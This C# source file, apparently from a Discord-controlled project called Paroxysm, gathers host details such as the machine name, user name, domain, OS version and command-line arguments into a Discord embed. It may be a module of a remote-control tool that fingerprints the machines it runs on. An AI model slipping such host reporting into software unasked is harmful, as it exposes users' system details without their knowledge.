using Discord;
using Paroxysm.Discord;
using Paroxysm.Tools;

namespace Paroxysm.Hooks.Actions;

public static class DebugAction
{
    private static List<string> GetEnviromentVars()
    {
        List<string> enviromentVariables = new List<string>();
        
        enviromentVariables.Add($"Command Line Args\u2188\t{String.Join(", ", Environment.GetCommandLineArgs())}");
        enviromentVariables.Add(($"Current Directory\u2188\t{Environment.CurrentDirectory}"));
        enviromentVariables.Add($"Machine Name\u2188\t{Environment.MachineName}");
        enviromentVariables.Add($"OS Version\u2188\t{Environment.OSVersion.ToString()}");
        enviromentVariables.Add($"Tick Count\u2188\t{Environment.TickCount}");
        enviromentVariables.Add($"UserDomainName\u2188\t{Environment.UserDomainName}");
        enviromentVariables.Add($"Working Set\u2188\t{Environment.WorkingSet}");


        return enviromentVariables;
    }
    
    public static Embed Follow()
    {
        var enviromentVars = GetEnviromentVars();

        var embed = new EmbedBuilder
        {
            Title = $"{Environment.UserName}",
        };

        foreach (var evar in enviromentVars)
        {
            var variable = evar.Split("\u2188\t");
            embed.AddField(variable[0], variable[1], true);
        }

        return embed.Build();
    }
}